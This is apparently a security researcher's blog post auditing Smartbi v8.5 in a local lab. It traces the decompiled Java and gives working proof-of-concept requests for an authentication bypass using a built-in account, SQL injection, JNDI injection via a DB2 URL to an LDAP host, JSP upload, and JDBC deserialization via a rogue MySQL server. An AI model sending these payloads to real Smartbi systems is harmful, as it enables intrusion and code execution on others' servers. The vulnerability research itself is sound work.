---
title: Smartbi v8.5 代码审计
date: 2025-08-07T16:00:00+08:00
tags:
  - "Java 代码审计"
categories:
  - "Java"
description: Smartbi v8.5 代码审计
showToc: true
draft: false
tocOpen: true
---
# Smartbi v8.5 代码审计

# 目录结构

```
E:.
├─Infobright	用于分析型数据存储
├─jdk	Java 开发环境
├─MySQL		数据库服务
├─SmartbiUnionServer	Smartbi 的 Union Server 模块（Presto 引擎相关）
├─smartbixmla		Smartbi XMLA 接口模块，主要用于与外部如 Excel 的数据透视表通信
└─Tomcat	Smartbi 使用的 Web 应用服务器，部署了核心 web 模块和插件扩展
    ├─bin	包含Tomcat的启动/关闭脚本、Smartbi 的配置文件、运行日志
    |   |  exts-smartbi		扩展模块
    |	|  Index-smartbi	搜索索引
    |	|  mlogs-smartbi	模块级别日志
    |	|  SmartbiX-ExtractData	 数据导出模块
    |   |  smartbi_repoBackup	仓库备份
    |	
    ├─conf	配置文件所在
   	|	│  catalina.policy
	|	│  catalina.properties
	|	│  context.xml
	|	│  logging.properties
	|	│  server.xml
	|	│  tomcat-users.xml
	|	│  web.xml
	|	│
	|	└─Catalina
    |			└─localhost
    ├─lib	包含Tomcat运行所需的JAR库文件
    ├─logs
    ├─temp
    ├─webapps	实际部署的Web应用程序
    ├─work	 Tomcat 运行时自动生成的 JSP 编译缓存
```



在找源码的过程中，看到该系统使用了 Servlet 框架，理解 Servlet 框架对后续的代码理解有帮助

>servlet
>
>https://86263008.github.io/web2024/back/java/jsp/servlet/index.html
>
>https://kirklin.github.io/PrivateNotes/Java%E5%85%A8%E5%A5%97/JavaWeb/Servlet/#_11
>
>https://blog.csdn.net/yxmoar/article/details/109889006
>



# 历史漏洞：

## 未授权访问

> Smartbi 身份认证绕过漏洞
>
> https://www.freebuf.com/vuls/373015.html
>

网上的 身份认证/内置用户登陆 绕过的代码和v8.5版本的有一些区别，不过还是能跟踪到代码漏洞点



1、代码分析

E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\filter\CheckIsLoggedFilter.class

首先找到 CheckIsLoggedFilter.class 文件的 needToCheck() 方法，

![20250801173411982](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071648181.png)

```Java
private boolean needToCheck(String className, String methodName) {
    //判断 className 非空且不是 BIConfigService （ BIConfigService 是完全信任的服务类，不需要任何登录校验）
    if (!StringUtil.isNullOrEmpty(className) && !className.equals("BIConfigService")) {
        //如果调用的是 UserService 中的方法，即 methodName 属于{"login", "loginFor", "clickLogin", "loginFromDB", "logout", "isLogged", "isLoginAs", "checkVersion", "hasLicense"}
        if (className.equals("UserService") && StringUtil.isInArray(methodName, new String[]{"login", "loginFor", "clickLogin", "loginFromDB", "logout", "isLogged", "isLoginAs", "checkVersion", "hasLicense"})) {
            //则不需要登录验证
            return false;
```

接下来找找 CheckIsLoggedFilter 是在哪里利用的？

 找到在web.xml中有我们需要的路由 `/vision/RMIServlet`

> 看到的文章中都是先知道了 RMIServlet 这个路由，然后找到 CheckIsLoggedFilter 
>
> ![20250801175223846](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071652623.png)



![20250801174751116](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071652566.png)

尝试访问 http://localhost:18080/smartbi/vision/RMIServlet

![20250801174912101](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071653701.png)

POC：

主要结构：

```
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: localhost:18080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Connection: close

className=UserService&methodName=loginFromDB&params=["service","0a"]
```

内置用户（service），口令为0a；public、system可能不存在。

![20250806083335304](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071657532.png)

![20250801175555800](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071657358.png)

![20250801175813702](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658122.png)

使用hackbar也可以，

![20250801180133641](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658447.png)

之后访问 http://localhost:18080/smartbi/vision/

发现已经进入后台

![20250801180228087](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658299.png)



## SQL注入（FileResource）



FileResource 是用于处理文件的 Servlet

![20250802132757662](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658975.png)

E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\fileresource\FileResourceServlet.class

![20250802132840122](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658788.png)

分析代码：

![20250802133545296](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658880.png)

```java
} else {
    //从请求中获取 resID
    resID = request.getParameter("resId");
    //初始化 headerType 为 inline，inline 表示浏览器尝试直接在页面中打开文件（比如 PDF、图片）
    String headerType = "inline";
    //判断操作类型 opType 是 "OPEN" 还是 "DOWNLOAD"
    if ("OPEN".equals(opType)) {
        actionType = OperationType.FILE_RESOURCE_OPEN;
    } else {
        actionType = OperationType.FILE_RESOURCE_DOWNLOAD;
        headerType = "attachment";
    }

    //使用 Connection 对象创建 Statement，用于执行 SQL 
    Statement stat = conn.createStatement();
    //执行 SQL 查询，从 t_fileresource 表中查找指定 resID 的资源文件信息
    ResultSet rs = stat.executeQuery("select c_content,c_name,c_alias,c_type from t_fileresource where c_id = '" + resID + "'");
```

**没有对 resID 参数进行过滤直接使用 executeQuery() 拼接执行sql语句，造成sql注入**



构造payload：

```
http://127.0.0.1:18080/smartbi/vision/FileResource?resId=1&opType=DOWNLOAD
```

可以sqlmap跑一下：

```
python sqlmap.py -u "http://127.0.0.1:18080/smartbi/vision/FileResource?resId=1&opType=DOWNLOAD"
```

![20250802140622564](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071658445.png)



## SQL注入（RMIServlet）



E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\repository\FileResourceDAO.class

![20250805165508359](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659185.png)

getFileResource方法接收参数 id ，直接拼接SQl语句查询 t_fileresource 表，没有对 id 进行过滤或者其他的安全措施，存在SQL注入风险

![20250805181321541](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659316.png)

getFileResource方法在URLLinkService中调用：

E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\client\urllink\URLLinkService.class

![20250805181341517](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659108.png)



**漏洞复现：**

```
POST /smartbi/vision/RMIServlet HTTP/1.1

Content-Type: application/x-www-form-urlencoded

className=UrlLinkService&methodName=getFileResource&params=["1'union select database(),2,3,4,5,6#"]
```

```
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: localhost:18080
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=7DDE39A449342C004D2F35ABF13BB5AB
Connection: close
Content-Length: 99

className=UrlLinkService&methodName=getFileResource&params=["1'union select database(),2,3,4,5,6#"]
```

![20250805182305339](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659622.png)



## 后台rce



E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\sync\SyncServlet.class

![20250802145216052](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659333.png)

```java
if (!ServletFileUpload.isMultipartContent(request)) {
    request.setCharacterEncoding("UTF-8");
    String type = request.getParameter("type");
    response.setBufferSize(4096);
    //type=sqldictsync 时执行
    if (type.equals("sqldictsync")) {
        //记录时间
        long startTime = System.currentTimeMillis();
        //数据库连接参数
        String dbType = request.getParameter("dbType");
        String dbServer = request.getParameter("dbServer");
        String dbName = request.getParameter("dbName");
        String dbUser = request.getParameter("dbUser");
        String dbPass = request.getParameter("dbPass");
        String querySql = request.getParameter("querySql");
        boolean dbNameOnly = "true".equals(request.getParameter("dbNameOnly"));
        String clientId = null;
        //输出调试日志，记录数据库名、查询语句等
        log.debug("sqldictsync[dbName:" + dbName + ",dbNameOnly:" + dbNameOnly + ",querySql:" + querySql + "]");
        //如果 dbNameOnly == true，数据库名和 SQL 进行同步，执行SyncResources
        if (dbNameOnly) {
            clientId = (new SyncResources()).synchronize(dbName, querySql);
        } else {//否则就完整使用所有连接信息进行数据库连接和 SQL 查询
            clientId = (new SyncResources()).synchronize(dbType, dbServer, dbName, dbUser, dbPass, querySql);
        }
```

此处的参数 dbType、dbServer、dbName等全部由用户输入，可控且无任何检验、过滤



E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\sync\SyncResources.class

```Java
//接收用户输入的数据库参数
public String synchronize(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String querySql) throws Exception {
    //使用 DbUtil.getConnection 创建数据库连接，继续跟进
    Connection conn = DbUtil.getConnection(dbType, dbServer, dbName, dbUser, dbPass, (String)null);
    if (conn == null) {
        throw new IllegalArgumentException(StringUtil.getLanguageValue("Incomingconnectionparametererrorestablishconnectionfailed"));
    } else {
        int colsCount = 8;
        Reader reader = new ResultSetReader(conn, querySql, colsCount);
        DictTree tree = new DictTree(reader);
        return this.doSynchronize(tree);
    }
}
```



E:\Smartbi\SmartbiUnionServer\plugin\SmartbiPrestoClickHouseJdbc\smartbiCommon.jar!\smartbi\util\DbUtil.class

```java
public static Connection getConnection(String driver, String url, String dbUser, String dbPass, String connName) throws Exception {
    DefaultConnectionInfo info = new DefaultConnectionInfo();
    info.setId(UUIDGenerator.generate());
    info.setName(connName);
    // driver 和 url 参数都是从 drvInfo取值
    info.setDriver(driver);
    info.setUrl(url);
    info.setUser(dbUser);
    info.setPassword(dbPass);
    //调用 getConnection 方法。执行 jdbc 
    return ConnectionPool.getInstance().getConnection(info);
}

public static Connection getConnection(String dbType, String dbServer, String dbName, String dbUser, String dbPass, String connName) throws Exception {
    DBType driverType = null;

    try {
        driverType = DBType.valueOf(dbType.toUpperCase());
    } catch (Exception var9) {
        return null;
    }

    String[] drvInfo = translateDriverInfo(driverType, dbServer, dbName);
    if (drvInfo == null) {
        return null;
    } else {
        DefaultConnectionInfo info = new DefaultConnectionInfo();
        info.setId(UUIDGenerator.generate());
        info.setName(connName);
        info.setDriverType(driverType);
        info.setDriver(drvInfo[0]);
        info.setUrl(drvInfo[1]);
        info.setUser(dbUser);
        info.setPassword(dbPass);
        return ConnectionPool.getInstance().getConnection(info);
    }
}
```

跟进 translateDriverInfo

```Java
public static String[] translateDriverInfo(DBType dbType, String serverName, String dbName) {
    return translateDriverInfo(dbType, serverName, dbName, (String)null);
}

public static String[] translateDriverInfo(DBType dbType, String serverName, String dbName, String dbEncoding) {
    String[] result = new String[2];
    //以 dbType 确定数据库类型
    switch (dbType) {
        case DB2:
        case DB2_400:
            result[0] = "COM.ibm.db2.jdbc.net.DB2Driver";
            result[1] = "jdbc:db2://" + serverName + "/" + dbName;
            break;
        case DB2_V9:
            result[0] = "com.ibm.db2.jcc.DB2Driver";
            if (serverName.indexOf(":") == -1) {
                result[1] = "jdbc:db2://" + serverName + ":50000/" + dbName + ":deferPrepares=false;";
            } else {
                result[1] = "jdbc:db2://" + serverName + "/" + dbName + ":deferPrepares=false;";
            }
            break;
```





构造poc:

```
type=sqldictsync&dbType=DB2_V9&dbServer=localhost:6688&dbName=a:a=a;clientRerouteServerListJNDIName=ldap://169.254.39.1:1389/6bqlht;

type=sqldictsync&dbType=DB2_V9&dbServer=8.8.8.8:18080&dbName=a:a=a;clientRerouteServerListJNDIName=ldap://169.254.39.1:1389/6bqlht;
```



![20250802165747255](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071659797.png)









## tomcat 历史漏洞（实则没有）

确定 tomcat 版本为 `Apache Tomcat Version 7.0.34`

E:\Smartbi\Tomcat\RELEASE-NOTES

![20250731181914395](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700892.png)



## 1、AJP 导致的 RCE

> CVE-2020-1938 ：Apache Tomcat AJP 漏洞复现和分析
>
> https://www.cnblogs.com/backlion/p/12870365.html
>
> 
>
> 默认情况下,Apache Tomcat会开启AJP连接器,方便与其他Web服务器通过AJP协议进行交互.但Apache Tomcat在AJP协议的实现上存在漏洞,导致攻击者可以通过发送恶意的AJP请求,可以读取或者包含Web应用根目录下的任意文件,如果配合文件上传任意格式文件，将可能导致任意代码执行(RCE).该漏洞利用AJP服务端口实现攻击,未开启AJP服务对外不受漏洞影响（tomcat默认将AJP服务开启并绑定至0.0.0.0/0）.



确认 18009 端口开放，且能够建立 TCP 连接：

`Test-NetConnection -ComputerName 127.0.0.1 -Port 18009`

![20250731185501657](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700634.png)

使用 Ghostcat 漏洞检测工具：

https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi

脚本成功建立了AJP协议连接返回了Tomcat 7.0.34的错误页面

![20250731191051181](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700131.png)

可能由于Smartbi对WEB-INF目录做了额外保护或者Tomcat配置了限制访问，并不能读取到文件



## 文件上传



文件位置：Tomcat/webapps/smartbi/vision/designer/imageimport.jsp

```jsp
<%@ page import="java.io.*"%>
<%
try {
    String path = request.getSession().getServletContext().getRealPath("") + "/vision/designer/images/";
    File dir = new File(path);
    if (!dir.exists()) {
       dir.mkdirs();
    }
    //从请求头 X-File-Name 获取上传文件名
    String fileName = new String(request.getHeader("X-File-Name").getBytes("ISO-8859-1"), "UTF-8");
    //获取文件类型
    String fileType = request.getHeader("X-File-Type");
    //判断是否包含 image 字符串 
    if(fileType.indexOf("image") == -1) {
       response.setContentType("text/html; charset=UTF-8");
       response.resetBuffer();
       response.getOutputStream().write("error file type!".getBytes("UTF-8"));
       return;
    }
    File file = new File(path + fileName);
    FileOutputStream fos = new FileOutputStream(file);
    int bytesRead;
    byte[] buf = new byte[1024]; // 4K buffer
    while ((bytesRead = request.getInputStream().read(buf)) != -1) {
       fos.write(buf, 0, bytesRead);
    }
    fos.flush();
    fos.close();
    smartbi.net.sf.json.JSONObject jobj = new smartbi.net.sf.json.JSONObject();
    jobj.put("url", path.substring(path.lastIndexOf("images/")) + "/" + fileName);
    //jobj.put("dir", dir.getCanonicalPath());
    String resultStr = jobj.toString();
    response.setContentType("text/html; charset=UTF-8");
    response.resetBuffer();
    response.getOutputStream().write(resultStr.getBytes("UTF-8"));
} catch (Exception e) {
    e.printStackTrace();
}
%>
```

对上传的文件名、MIME类型无判断、不严谨，可伪造伪造文件类型上传成功，造成漏洞





**漏洞复现：**

路由：http://localhost:18080/smartbi/vision/designer/imageimport.jsp

需要配置页（http://localhost:18080/smartbi/vision/config.jsp）的登录密码，所以不能和未授权访问结合，属于后台漏洞

![20250805160347015](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700365.png)





poc:

```
//GET 和 POST 都可以
GET /smartbi/vision/designer/imageimport.jsp HTTP/1.1

X-File-Type: image
X-File-Name: 1.jsp

<%="qwer"%>
```

```
GET /smartbi/vision/designer/imageimport.jsp HTTP/1.1
Host: localhost:18080
Cache-Control: max-age=0
Authorization: Basic YWRtaW46YWRtaW4=
sec-ch-ua: "Chromium";v="113", "Not-A.Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=EE2C934216E3D698C0C316CE1B30F7AF
X-File-Type: image
X-File-Name: 1.jsp
Connection: close
Content-Length: 11

<%="qwer"%>
```



![20250805161922205](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700613.png)



![20250805162159129](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700732.png)





![20250805162430488](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700420.png)



## JDBC反序列化

>JDBC反序列化学习
>
>https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/
>
>https://xz.aliyun.com/news/7754
>
>https://www.cnblogs.com/Litsasuk/articles/18410624
>
>https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html

### 关键条件：

1. mysql-connector-java 的依赖版本为5.1.44，支持 `autoDeserialize=true` 参数，具备反序列化触发点

2. 在 pom.xml 中 common-collections 版本为 3.2.1，存在cc反序列化利用链

3. 存在方法调用反射机制 RMIServlet ，可远程调用任意类方法

   

![20250806085001007](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701680.png)

![20250806125442264](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701410.png)

![20250806125519870](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701846.png)



### 漏洞分析：

触发点：DataSourceService -> testConnection

E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\client\datasource\DataSourceService.class

```java 
public void testConnection(IDataSource dataSource) {
        MetaDataServiceImpl.getInstance().testConnection(dataSource);
    }
```



攻击者向`/vision/RMIServlet` 发送如下 POST 请求：

```
POST /smartbi/vision/RMIServlet HTTP/1.1
Host: 127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded

className=DataSourceService&methodName=testConnection&params=[{...}]
```

通过类名和方法名反射调用，即：

`className = DataSourceService` 

`methodName = testConnection` 

`params = [...]` 是 JSON 数组字符串，传进去后被包装成 `JSONArray` 类型。

```java
public class RMIServlet extends HttpServlet {
    ...
    public String processExecute(HttpServletRequest request, String className, String methodName, String params) {
        //RMIModule.getInstance() 返回一个远程服务模块（单例），它负责管理所有可远程调用的服务，getService(className) 根据类名获取对应的 ClientService 实例。
        ClientService service = RMIModule.getInstance().getService(className);
        String resultStr = null;

        try {
            //结果字符串的构建器 buff 用于生成最终 JSON 格式的响应体
            StringBuilder buff = (new StringBuilder()).append('{');
            //判断 service 是否存在，未找到就抛出异常
            if (service == null) {
                if (className != null) {
                    Locale locale = CommonConfiguration.getInstance().getLocale();
                    String notFoundClass = StringUtil.replaceLanguage("${Notfoundclass}", locale);
                    throw (new SmartbiException(CommonErrorCode.UNKOWN_ERROR)).setDetail(className + " " + notFoundClass);
                }
            } else {
                //记录调用时间
                long startTime = (new Date()).getTime();
                //执行 execute 方法，即反射调用
                Object obj = service.execute(methodName, new JSONArray(params));
                long duration = (new Date()).getTime() - startTime;
                if (obj == null) {
                    buff.append("\"retCode\":0");
                }              
```

接着 `params` 调用下面的方法： 

```Java
Object obj = service.execute(methodName, new JSONArray(params));
```

`execute`方法处理逻辑：将传入的 `JSON` 转为 `IDataSource` 对象,

```java
public class ClientService {
    ...
    //接收 JSON 数组和方法名
	public Object execute(String var1, JSONArray var2) {
        try {
            //从 this.a 中取出方法名对应的 Method 对象
            Method var3 = (Method)this.a.get(var1);
            //不存在抛出异常
            if (var3 == null) {
                throw (new SmartbiException(CommonErrorCode.METHOD_NAME_ERROR)).setDetail(var1);
            } else {
                //检查参数个数
                Class[] var4 = var3.getParameterTypes();
                if (var4.length != var2.length()) {
                    throw (new SmartbiException(CommonErrorCode.PARAM_COUNT_ERROR)).setDetail(StringUtil.getLanguageValue("Method2") + "\"" + var1 + "\"" + StringUtil.getLanguageValue("Thenumberofparametersis") + " " + var4.length + " ," + StringUtil.getLanguageValue("Butthenumberofargumentspassedinis") + " " + var2.length() + " .");
                } else {
                    //创建Java类型参数数组
                    Object[] var5 = new Object[var2.length()];

                    try {
                        //进行类型转换，将 JSON -> Java对象
                        //获取每个参数的泛型类型（var6）
                        Type[] var6 = var3.getGenericParameterTypes();
                        //遍历 JSON 参数，使用工具类 JSONUtil.jsonToObject(...) 转为目标类型
                        for(int var7 = 0; var7 < var5.length; ++var7) {
                            //var2 是 JSONArray，也就是传入的 params
                            Object var8 = var2.get(var7);
                            //目标方法 testConnection 的参数类型即 IDataSource
                            Class var9 = var4[var7];
                            //泛型类型
                            Type var10 = var6[var7];
                            //把 JSON 中的 JSONObject 转换成一个 Java 对象（var9 指定的类型），并作为方法参数传入
                            var5[var7] = JSONUtil.jsonToObject(var8, var9, var10);
                        }
                    } 

```

再进入 `DataSourceService.testConnection()`

```java
public void testConnection(IDataSource dataSource) {
        MetaDataServiceImpl.getInstance().testConnection(dataSource);
    }
```

进入 `MetaDataServiceImpl.testConnection()`：

```Java
conn = ConnectionPool.getInstance().getConnection(ds);
```

```java
public class MetaDataServiceImpl {
    ...
    //主要是将 IDataSource 转换为系统内部 DataSource 对象，然后尝试建立连接
    public void testConnection(IDataSource dataSource) {
    //实例化 Smartbi 内部使用的 DataSource 类
    DataSource ds = new DataSource();
    //UUIDGenerator.generate() 应是一个工具类，生成随机 UUID
    ds.setId(UUIDGenerator.generate());
    //把外部传入的 IDataSource 转成系统内部 DataSource格式
    ds.setName(dataSource.getName());
    ds.setAlias(dataSource.getAlias());
    ds.setDriver(dataSource.getDriver());
    ds.setDesc(dataSource.getDesc());
    ds.setDbCharset(dataSource.getDbCharset());
    ds.setUrl(dataSource.getUrl());
    ds.setUser(dataSource.getUser());
    ds.setDriverType(dataSource.getDriverType());
    ds.setMaxConnection(dataSource.getMaxConnection());
    ds.setValidationQuery(dataSource.getValidationQuery());
    ds.setPassword(dataSource.getPassword());
    ds.setTransactionIsolation(dataSource.getTransactionIsolation());
    ds.setValidationQueryMethod(dataSource.getValidationQueryMethod());
    ds.setAuthenticationType(dataSource.getAuthenticationType());
    //如果 IDataSource 没有提供密码，并且提供了 ID，那么从数据库中查询旧数据源信息，取出其密码，用于本次连接
    if (dataSource.getPassword() == null && !StringUtil.isNullOrEmpty(dataSource.getId())) {
        DataSource dbDs = FreeQueryDAOFactory.getDataSourceDAO().load(dataSource.getId());
        ds.setPassword(dbDs.getPassword());
    }

    //声明 JDBC 连接对象 conn，后续用于建立连接
    Connection conn = null;

    try {
        //使用自定义的连接池 ConnectionPool 获取数据库连接
        conn = ConnectionPool.getInstance().getConnection(ds);
        if (DBType.PRESTO == dataSource.getDriverType()) {
            String sql = "SELECT 1";
            PreparedStatement stat = JdbcUtil.prepareStatement(conn, sql);
```

进入 `ConnectionPool.getConnection()`：进行数据池连接

```java
return this.driverConnect(poolName, ds);
```

```java
public class ConnectionPool implements Serializable {
    ...
    public Connection getConnection(IConnectionInfo ds) throws Exception {
    //判断是否为系统知识库
    if ("DS.SYSTEM\u77e5\u8bc6\u5e93".equals(ds.getId())) {
        ds = this.provider.getConnectionInfo("res");
    }

    //判断是否是 JNDI 数据
    if (ds.getUrl().startsWith("JNDI:")) {
        InitialContext cxt = new InitialContext();
        DataSource dataSource = (DataSource)cxt.lookup(ds.getUrl().substring("JNDI:".length()));
        return dataSource.getConnection();
    } else if (ds.getValidationQueryMethod() == 3) {//加载 JDBC 驱动
        String driverClass = ds.getDriver();
        Class<?> clazz = null;

        try {
            //通过自定义的 DynamicLoadLibManager 加载该类
            clazz = DynamicLoadLibManager.loadClass(driverClass);
        } catch (ClassNotFoundException var12) {
            //如果失败，使用备用 classLoader 加载
            ClassLoader clzLoader = (ClassLoader)Class.forName("smartbi.repository.DAOModule").getDeclaredField("classLoader").get((Object)null);
            clazz = clzLoader == null ? Class.forName(driverClass) : clzLoader.loadClass(driverClass);
        }
        
		//创建 JDBC 驱动对象实例
        Driver jdbcDriver = (Driver)clazz.newInstance();
        //构建连接所需的属性（用户名、密码）
        Properties prop = new Properties();
        prop.put("user", ds.getUser());
        prop.put("password", ds.getPassword());
        if (ds.getDriverType() == DBType.KYLIN) {
            prop.put("timezone", "GMT");
        }

        Object conn = null;

        try {
            //通过反射调用 DriverManager.getConnection() 这个重载的私有方法
            Method m = DriverManager.class.getDeclaredMethod("getConnection", String.class, Properties.class, ClassLoader.class);
            m.setAccessible(true);
            //使用系统中的 classLoader
            ClassLoader clzLoader = (ClassLoader)Class.forName("smartbi.repository.DAOModule").getDeclaredField("classLoader").get((Object)null);
            conn = m.invoke((Object)null, ds.getUrl(), prop, clzLoader);
        } catch (Exception var10) {
            try {
                Method m = DriverManager.class.getDeclaredMethod("getConnection", String.class, Properties.class, Class.class);
                m.setAccessible(true);
                conn = m.invoke((Object)null, ds.getUrl(), prop, clazz);
            } catch (Exception var9) {
                conn = DriverManager.getConnection(ds.getUrl(), prop);
            }
        }

        return (Connection)conn;
    } else {
        String poolName = null;
        if (ds.getId().equals("DS.SYSTEM\u77e5\u8bc6\u5e93")) {
            poolName = "res";
        } else {
            poolName = this.getPoolNameFromDatasource(ds);
        }

        try {
            driver.getConnectionPool(poolName);
            //调用 driverConnect 获取连接池连接
            return this.driverConnect(poolName, ds);
        } catch (SQLException var11) {
            this.createPool(ds);
            return this.driverConnect(poolName, ds);
        }
    }
}
```

此时服务器向远程的`FakeMysql`尝试连接，就会接收到`FakeMysql`返回的恶意序列化数据，



### **漏洞复现：**

搭建 FakeMysql 服务器，用 Javachains 搭建，将 3308端口开启，监听的是**本机IP地址的3308端口**

![20250806161415587](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701134.png)

构造 K1链

![20250806162032486](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702650.png)

构造poc:

```
className=DataSourceService&methodName=testConnection&params=[{"password":"","maxConnection":100,"user":"","driverType":"MYSQL","validationQuery":"SELECT 1 FROM DUAL","url":"jdbc:mysql://[本机IP]:3308/d4c5846?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","name":"JDBC","driver":"com.mysql.jdbc.Driver","id":"","desc":"","alias":"","dbCharset":"","identifierQuoteString":"`","transactionIsolation":-1,"validationQueryMethod":0,"dbToCharset":"","authenticationType":"STATIC"}]
->url编码
className=DataSourceService&methodName=testConnection&params=[{"password"%3a"","maxConnection"%3a100,"user"%3a"","driverType"%3a"MYSQL","validationQuery"%3a"SELECT+1+FROM+DUAL","url"%3a"jdbc%3amysql%3a//[本机IP]%3a3308/d4c5846%3fautoDeserialize%3dtrue%26statementInterceptors%3dcom.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","name"%3a"JDBC","driver"%3a"com.mysql.jdbc.Driver","id"%3a"","desc"%3a"","alias"%3a"","dbCharset"%3a"","identifierQuoteString"%3a"`","transactionIsolation"%3a-1,"validationQueryMethod"%3a0,"dbToCharset"%3a"","authenticationType"%3a"STATIC"}]




POST /smartbi/vision/RMIServlet HTTP/1.1
Host: localhost:18080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: */*
Origin: http://localhost
Referer: http://localhost:18080/smartbi/vision/index.jsp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=0BBBD2EC4AE481FB607FC501FA04897E
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Connection : keep-alive
Content-Length: 580

className=DataSourceService&methodName=testConnection&params=[{"password"%3a"","maxConnection"%3a100,"user"%3a"","driverType"%3a"MYSQL","validationQuery"%3a"SELECT+1+FROM+DUAL","url"%3a"jdbc%3amysql%3a//192.168.1.25%3a3308/d4c5846%3fautoDeserialize%3dtrue%26statementInterceptors%3dcom.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","name"%3a"JDBC","driver"%3a"com.mysql.jdbc.Driver","id"%3a"","desc"%3a"","alias"%3a"","dbCharset"%3a"","identifierQuoteString"%3a"`","transactionIsolation"%3a-1,"validationQueryMethod"%3a0,"dbToCharset"%3a"","authenticationType"%3a"STATIC"}]
```



![20250806162931145](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702241.png)



### 总结：

